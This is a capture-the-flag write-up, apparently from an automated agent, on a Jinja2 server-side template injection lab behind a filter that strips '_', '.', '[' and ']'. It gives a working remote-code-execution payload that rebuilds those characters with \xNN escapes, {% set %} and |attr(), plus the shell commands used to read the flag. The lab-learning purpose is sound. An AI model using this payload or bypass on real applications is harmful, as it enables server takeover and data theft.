# SSTI2 - Jinja2 SSTI behind a character-stripping filter, bypassed with \xNN escapes + attr()

## Metadata

ID: xebec-ssti2-charfilter-bypass
Title: SSTI2 - Jinja2 SSTI behind a character-stripping filter, bypassed with \xNN escapes + attr()
Source: cylabacademy.net lab instance (direct URL, no platform login required)
Type: web / server-side template injection + filter evasion
Tags: ssti, jinja2, flask, waf-bypass, filter-bypass, rce, web, cylab
Technique: ssti

## Challenge Summary

Same Flask "announce" application as SSTI1 (`<title>SSTI2</title>`), but the
input is passed through a character filter before rendering:

```python
announcement = re.sub(r'[_[\]\.]|base', "", announcement)
try:
    return render_template_string("<h1 ...>" + announcement + "</h1>")
except TemplateSyntaxError:
    return render_template_string("<h1 ...>Stop trying to break me >:(</h1>")
```

Goal: bypass the filter and read the flag file from the container.

## Initial Observations

- Identical surface to SSTI1: `POST /` field `content` -> `307` -> `/announce`.
- `{{7*7}}` -> `49`, `{{config}}` -> the Flask Config object: SSTI alive.
- `{{'a'~'b'}}` -> `ab`: quotes are NOT blocked.
- `{{'x'.upper()}}` and `{{''.__class__}}` -> "Stop trying to break me >:(".
- `{{config.__class__}}` -> renders **empty**, not the message.

## Acknowledgement

- Source: `content` form field. Sink: `render_template_string`.
- A filter strips characters, and a separate message is returned on template
  syntax errors.
- Hypothesis: SSTI is still present; the challenge is filter evasion, not a
  new vulnerability class.

## Memory Applied

- `knowledge/ssti.md` -> escalation ladder + "if `_` is blocked use
  `chr()`/indexing or read a value back from a header you control".
- `experiences/xebec-ssti1-render-template-string` -> the
  `config.__class__.__init__.__globals__` -> `os` -> `popen` chain, and the
  "one command per request" rule (concatenated commands broke the render in
  the previous lab).

## Filter characterisation (the key step)

Probing one character at a time (`A<char>B`) revealed the strip set exactly:

- Stripped: `_` `.` `[` `]`
- Preserved: `( ) ' " | : , ; - \ = + * < > & # ! ~ ^ % @ ` { } $` and
  all alphanumerics.

Two extra rules found while testing:

- The literal substring `base` is stripped too (`base64` -> `64`).
- The "Stop trying to break me >:(" string is **not a WAF**: it is the
  app's own `except TemplateSyntaxError` handler. Any payload that becomes a
  syntax error after stripping lands there. This is why
  `{{'x'.upper()}}` produced it (`'x'upper()` is invalid) while
  `{{config.__class__}}` rendered empty (`configclass` is just an undefined
  variable, which Jinja renders as "").

## Bypass

`_`, `.`, `[`, `]` are all unavailable, so attribute access and indexing must
avoid all four. Three facts made this work:

1. **Jinja string literals support `\xNN` escapes.** The filter never sees a
   literal `_` because the request contains `\x5f`. Jinja decodes it to `_`.
   Same trick for `\x2e` (`.`), `\x5b` (`[`), `\x5d` (`]`).
2. **`{% set %}` works and its block tag is not filtered**, so one variable
   holds the character and names are concatenated:
   `{% set u='\x5f' %}` then `u+u+'class'+u+u` == `__class__`.
3. **`|attr('name')` is the only attribute access left** (no dots), and in
   Jinja >= 3.1 `attr` performs **getattr only** - item lookup was removed.

Final working payload:

```text
{% set u='\x5f' %}{{ (config|attr(u+u+'class'+u+u)|attr(u+u+'init'+u+u)|attr(u+u+'globals'+u+u)|attr('get')('os')|attr('popen'))('id')|attr('read')() }}
```

Why each piece is necessary:

- `|attr('__globals__')|attr('os')` renders **empty**: `__globals__` is a
  `dict`, and `getattr(dict, 'os')` fails under Jinja >= 3.1. The fix is to go
  through a dict *method*: `|attr('get')('os')`.
- `|attr('read')()` - calling the result of a filter is valid Jinja; the value
  of `popen(...)` is a file object, so `attr('read')` then `()` returns the
  output as a string with no `.` anywhere.

## Attempts

### Attempt 1 - Characterise the filter

Action: submit `A<char>B` for ~40 characters.
Result: `_ . [ ]` removed; everything else preserved.
Analysis: the strip set is now known exactly; no guessing needed.

### Attempt 2 - Direct chain with dots

Action: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
Result: HTTP 500.
Analysis: `[]` stripped -> syntax error; the app's error handler is not even
reached because the render call itself fails first.

### Attempt 3 - `\x5f` escape test

Action: `{{ '\x5f' }}`, `{{ '\x5f\x5fclass\x5f\x5f' }}`,
`{% set u='\x5f' %}{{ u+u+'class'+u+u }}`.
Result: `_`, `__class__`, `__class__`.
Analysis: the escape route defeats the filter completely.

### Attempt 4 - Chain with `attr`, but `__globals__` -> `os`

Action: `...|attr('__globals__')|attr('os')`.
Result: HTTP 200 with an **empty** body; `|attr('keys')|length` returned 500.
Analysis: `attr` in this Jinja version is getattr-only, so a dict key lookup
returns Undefined. Redirect the lookup through `dict.get`.

### Attempt 5 - Shell commands silently returning nothing

Action: `wc -c /challenge/app.py`, `cat /challenge/requirements.txt`,
`base64 -w0 /challenge/app.py`.
Result: every one returned an empty body with status 200.
Analysis: the strip applies to the **whole request value, including the shell
command**, so `app.py` became `apppy` and `base64` became `64`. `popen` does
not raise - the shell error goes to stderr and `.read()` returns "".

### Attempt 6 - Working RCE

Action: insert `\x2e` for the dot in filenames:
`popen('cat /challenge/app\x2epy')`.
Result: full command output rendered; `uid=0(root)`.
Analysis: the same escape trick applies inside the command string, so
filenames survive.

### Attempt 7 - Locate, read and verify the flag

Action: `ls -la /` -> `find / -maxdepth 4 -iname *flag*` -> `cat /challenge/flag`
Result: `/challenge/flag`.
Analysis: 36 bytes, `academy{...}`, read back with `wc -c`, `md5sum` and
`od -c` - all consistent.

## Successful Approach

1. Confirm SSTI is alive (`{{7*7}}`, `{{config}}`).
2. Characterise the filter by probing characters one at a time instead of
   guessing.
3. Recognise that the taunting message is a `TemplateSyntaxError` handler,
   not a WAF.
4. Rebuild blocked characters with Jinja `\xNN` escapes + `{% set %}`.
5. Use `|attr()` for attributes; use `|attr('get')('k')` for dict keys.
6. Escape dots inside shell commands too.
7. Read and independently verify the flag.

## Tools Used

- `http_fetch` (existing) - recon of the home page.
- `ssti_probe` (existing) - all injection steps, including the `307` redirect.
- No new tool script was created and none was kept: existing tools were
  sufficient.

## Final Result

Flag obtained: `academy{sst1_f1lt3r_byp4ss_cc3256b8}` (36 bytes,
md5 `ca30ead7dfceee67f3991d321fa128b4`, confirmed byte-exact with `od -c`).

## Failed Approaches

- Dot/`[]`-based chain -> 500 (syntax error after stripping).
- `|attr('__globals__')|attr('os')` -> silent empty result, because `attr` is
  getattr-only in modern Jinja.
- Shell commands naming files with dots -> silently empty output; the dot had
  been stripped from the command itself.

## Lessons Learned

- **Empty output is evidence, not "nothing happened".** A silent empty body
  usually means the command was mangled, not that the target is empty. Check
  the command string for stripped characters.
- **Probe filters empirically.** One character per request turns a guess into
  a fact and immediately reveals the exact strip set.
- **A taunting message is often just an exception handler.** Reading the
  target source (via the RCE you already have) settles it in one request.
- **Server-side language escapes survive naive input filters**, because the
  filter sees the escape, not the character it produces.

## Reusable Knowledge

See `knowledge/ssti.md`, sections "Bypassing character-stripping filters" and
"Reading the filter source".
